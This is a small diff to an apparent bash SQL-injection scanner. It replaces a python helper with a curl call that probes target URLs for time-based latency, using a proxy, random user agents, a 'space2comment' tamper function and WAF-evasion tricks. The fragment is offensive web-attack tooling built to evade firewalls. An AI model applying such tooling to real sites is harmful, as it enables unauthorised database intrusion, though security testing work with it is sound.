@@ -158,7 +158,7 @@ local t4=$(space2comment_engine "$t2")
 
         local waf_trick=$(braindamage)
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
-local curl_output=$(python3 py^3.py "${target_url}${final_query}" "$random_port")
+local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
         local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
@@ -220,7 +220,7 @@ local t4=$(space2comment_engine "$t2")
         
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
 
-local curl_output=$(python3 py^3.py "${target_url}${final_query}" "$random_port")
+local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
 
         local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
